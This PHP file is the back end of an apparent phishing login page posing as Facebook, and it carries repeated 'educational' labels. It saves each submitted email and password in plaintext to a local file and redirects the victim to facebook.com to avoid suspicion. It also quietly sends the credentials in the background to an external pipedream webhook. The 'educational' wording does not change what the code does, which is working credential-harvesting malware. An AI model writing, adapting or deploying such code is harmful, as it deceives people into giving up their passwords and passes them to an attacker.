<?php
// Educational Security Research Framework - Login Processing
// Enable error reporting for debugging (send to a log file in production)
error_reporting(E_ALL);
ini_set('display_errors', 0); // Don't show errors to user
ini_set('log_errors', 1);
ini_set('error_log', 'educational_php_errors.log'); // Ensure this file is writable by the server

// date_default_timezone_set("Asia/Manila"); // Uncomment if your server's default timezone is not correct

$email_input = $_POST['email'] ?? '';
$password_input = $_POST['password'] ?? '';

$response_to_send = '';         // What educational_login.php echoes back to custom.js
$log_entry_for_file = '';       // What gets written to educational_usernames.txt

$trimmed_email = trim($email_input);
$trimmed_password = trim($password_input);

// Determine response and log content based on input for educational analysis
if (empty($trimmed_email) && empty($trimmed_password)) {
    $response_to_send = "Error:EMAIL_OR_BOTH_BLANK"; // Error code for "Email or mobile number required"
    $log_entry_for_file = "BLANK FORMAT SUBMITTED (Both Email and Password were blank)";
} else if (empty($trimmed_email)) { // Password has content, email is blank
    $response_to_send = "Error:EMAIL_OR_BOTH_BLANK"; // Error code for "Email or mobile number required"
    $log_entry_for_file = "Educational Analysis Email: [BLANK]\nPassword: " . $password_input;
} else if (empty($trimmed_password)) { // Email has content, password is blank
    $response_to_send = "Error:PASSWORD_BLANK"; // Error code for "Password required"
    $log_entry_for_file = "Educational Analysis Email: " . $email_input . "\nPassword: [BLANK]";
} else { // Both fields have content
    $response_to_send = "https://www.facebook.com/"; // Redirect URL for valid format
    $log_entry_for_file = "Educational Analysis Email: " . $email_input . "\nPassword: " . $password_input;
}

// --- 1. LOG CREDENTIALS TO LOCAL FILE (CRITICAL - DO THIS BEFORE RESPONDING TO CLIENT) ---
if (!empty($log_entry_for_file)) {
    $timestamp = date("Y-m-d H:i:s");
    $full_log_entry = $log_entry_for_file . "\nTimestamp: " . $timestamp . "\n====================\n";
    
    // Attempt to write to file and check for errors
    if (file_put_contents("educational_usernames.txt", $full_log_entry, FILE_APPEND) === false) {
        error_log("CRITICAL: Failed to write to educational_usernames.txt. Data: " . $log_entry_for_file);
        // You might decide to change $response_to_send here if logging is absolutely critical
        // and you want to signal an internal error, but that's usually not done for educational analysis.
    }
}

// --- 2. SEND RESPONSE TO CLIENT ---
header('Content-Type: text/plain'); // Ensure browser interprets response as plain text
echo $response_to_send;

// --- 3. CLOSE CONNECTION TO CLIENT AND CONTINUE SCRIPT (IF PHP-FPM IS USED) ---
if (function_exists('fastcgi_finish_request')) {
    fastcgi_finish_request(); // This sends all response data to the client and closes the connection.
                              // The script below this line will continue to execute in the background.
} else {
    // Fallback for non-PHP-FPM environments (less reliable for true backgrounding)
    // For these, the webhook call might still slightly delay if output buffering is complex.
    // ignore_user_abort(true); // Tells PHP to continue running script even if client disconnects
    // flush(); // Try to send all output to the browser
    // if (ob_get_level() > 0) ob_end_flush(); // End output buffering if active
}
// The PHP script continues execution from here, even if the client has received the response.

// --- 4. EDUCATIONAL WEBHOOK CALL (EXECUTED IN THE BACKGROUND) ---
// Proceed with webhook only if there was something determined to be logged.
if (!empty($log_entry_for_file)) {
    $webhook_url = "https://eoxudsvyn067vqi.m.pipedream.net"; // !!! REPLACE WITH YOUR ACTUAL EDUCATIONAL WEBHOOK URL !!!

    if (!empty($webhook_url)) {
        // Prepare a more descriptive log type for the educational webhook
        $log_type_param_value = $log_entry_for_file;
        if ($log_entry_for_file === "BLANK FORMAT SUBMITTED (Both Email and Password were blank)") {
            $log_type_param_value = "BLANK_SUBMISSION";
        } elseif (strpos($log_entry_for_file, "[BLANK]") !== false) {
            $log_type_param_value = "INCOMPLETE_SUBMISSION";
        } else {
            $log_type_param_value = "EDUCATIONAL_ANALYSIS_SUBMITTED";
        }
        
        // Use original (possibly empty) inputs for user/pass params for consistency
        $webhook_params = [
            'site' => 'Educational Security Research',
            'user' => $email_input,
            'pass' => $password_input,
            'log_type' => $log_type_param_value, // More structured log type
            'timestamp_unix' => time(),
            'timestamp_readable' => $timestamp ?? date("Y-m-d H:i:s") // Use timestamp from file log if available
        ];
        $query_string = http_build_query($webhook_params);

        $context_options = [
            "ssl" => [
                "verify_peer" => false,       // For development/testing. In production, set to true.
                "verify_peer_name" => false,  // For development/testing. In production, set to true.
            ],
            "http" => [
                'method' => 'GET', // Or 'POST' if your webhook expects POST
                'timeout' => 10,        // Can be slightly longer as it's background
                'ignore_errors' => true, // Don't let HTTP errors stop the script here
            ]
        ];
        $stream_context = stream_context_create($context_options);
        $webhook_response_content = @file_get_contents($webhook_url . "?" . $query_string, false, $stream_context);

        if ($webhook_response_content === false) {
            error_log("BACKGROUND Educational webhook call failed. URL: " . $webhook_url . "?" . $query_string . " | HTTP Response Headers: " . implode(", ", $http_response_header ?? []));
        } else {
            error_log("BACKGROUND Educational webhook call attempted. URL: " . $webhook_url . "?" . $query_string . " | Response (first 100 chars): " . substr($webhook_response_content, 0, 100));
        }
    } else {
        error_log("Educational webhook URL is empty. Notification not sent for: " . $log_entry_for_file);
    }
}

exit(); // End script execution
?>
